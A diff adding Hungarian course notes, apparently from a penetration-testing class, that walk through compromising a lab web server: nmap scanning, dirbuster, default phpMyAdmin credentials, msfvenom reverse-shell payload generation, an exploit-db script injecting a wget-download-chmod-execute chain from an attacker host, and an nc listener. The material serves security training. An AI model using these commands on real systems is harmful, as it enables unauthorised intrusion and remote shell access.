@@ -81,3 +81,36 @@ msfconsole > use exploit/multi/handler // ez csak listener
 set payload php/meterpreter/reverse_tcp
 run // olyan mint a netcates listener
 
+6.gyak
+thecartpress 
+exploit-db.com
+zh-n verzióban feljebb lehet menni de lejebb nem
+exploit-dbn vannak x-k, pipák azt jelentik h verifyolta a cég ha pipa van
+xss típusú sérülékenység: 
+authentikálni kell magam
+weboldal "feltörése":
+1. ping 40.0.5.10 (gép pingelése)
+2. sudo nmap -sS -sV -p 50-3000 40.0.5.10 portokat megnézni
+3. dirbuster , megnézzük a response-t (phpmyadmin)
+4. view page source (verzió szám megnézése talán)
+5. felhasználó / jelszó kombó (pma / pmapass) (lehet default jelszó használat googleon)
+6. 
+  0.milyen rendszert akarok támadni? Linux 64 bites (systeminfo -> win / uname -a -> linux) zhn minden gép linux 64 bites
+  1.a meghatározott rendszertípusra msfvenom-al készítünk egy reverse shellt (ez a saját gépünkön készül) (msfvenom cheatsheet infinitelogins)
+    1 fázisú payloadot (stageless) 
+    (METERPRETER msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=30.0.1.11 LPORT=4444 -f elf > kriszshell.elf)
+    (NON METERPRETER msfvenom -p linux/x64/shell_reverse_tcp LHOST=30.0.1.11 LPORT=4444 -f elf > kriszshell.elf)
+  2.Célpont keresek egy mappát amin van írási jogom (tmp mappa linuxon, windowson temp) 
+    a, belépünk a /tmp mappába a célgépen
+    b, kitöröljük az előző / már ott lévő shell(eket)
+    c, letöltjük ide a mi gépünkről a shell-t (scp, base64,
+      Fájlmásolás Támadóról Cépontra  
+      a, támadón belépek abba a mappába ahol a shell/fájl van
+      b, python3 -m http.server [PORT] (opcionális a port)
+      python3 50457.py 40.0.5.10 80 /phpmyadmin pma pmapass "cd /tmp;rm -rf kriszshell.elf;wget http://30.0.1.11:8000/kriszshell.elf;chmod 777     /tmp/kriszshell.elf;/tmp/kriszshell.elf"
+    d, futtathatóvá tesszük a shellt 
+    e, listener a saját gépünkön  nc -lvnp 4444
+    f, futtatás
+    
+
+    
